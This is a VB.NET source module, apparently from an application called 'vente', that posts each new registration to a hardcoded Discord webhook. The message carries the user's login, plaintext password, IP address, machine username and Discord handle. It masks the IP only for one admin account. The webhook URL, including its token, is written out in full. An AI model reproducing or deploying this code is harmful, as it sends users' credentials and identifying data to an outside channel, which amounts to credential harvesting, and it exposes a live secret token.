Imports System.IO
Imports System.Net
Imports System.Text
Imports Newtonsoft.Json
Imports vente.VenteData

Module DiscordRegLog
    Async Sub Send()

        If stored_username = "" Then
            stored_username = "N/A"
        End If
        If stored_password = "" Then
            stored_password = "N/A"
        End If
        If stored_username = "eddit" Then
            stored_ip = "HIDDEN | ADMIN"
        End If
        Dim webhookUrl As String = "https://discord.com/api/webhooks/1186362777372217346/uhJUpwdCDfYtICcrAeRP47s0iE0OTFL_EHe2H2tkiciXk8K-YCTjjxhuBdonvM0w0uAk"
        Dim DataIgodzina As String = DateTime.Now.ToString

        Dim embedContent As String = $"{{ 
            ""embeds"":[
                {{
                    ""title"":""** {stored_username} ** Registered new account."", 
                    ""description"":"""",
                    ""color"":16711680,
                    ""fields"":[
                        {{
                            ""name"":""SESSION INFORMATION"",
                            ""value"":"" \n **IP:** {stored_ip} \n **MachineName:** {Environment.UserName} \n **Login:** {stored_username} \n  **Password:** {stored_password} \n **Discord** {RegisterPage.RegisterDiscord.Text} \n **Index:** {Web_Database}{stored_username}"",
                            ""inline"":true
                        }}
                    ],
                    ""image"": {{
                        ""url"":""""
                    }},
                    ""thumbnail"": {{
                        ""url"":""https://i.imgur.com/n1Xyipo.png""
                    }},
                    ""footer"": {{
                        ""text"":""Session login date {DataIgodzina}"",
                        ""icon_url"":""""
                    }}
                }}
            ]
        }}" ' Tutaj dostosuj zawartość embeda


        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(webhookUrl), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "application/json"

        Using streamWriter As New StreamWriter(request.GetRequestStream())
            streamWriter.Write(embedContent)
            streamWriter.Flush()
            streamWriter.Close()
        End Using

        Try
            Dim response As HttpWebResponse = DirectCast(request.GetResponse(), HttpWebResponse)

        Catch ex As WebException
            MsgBox($"Wystąpił błąd: {ex.Message}")
        End Try

    End Sub
End Module
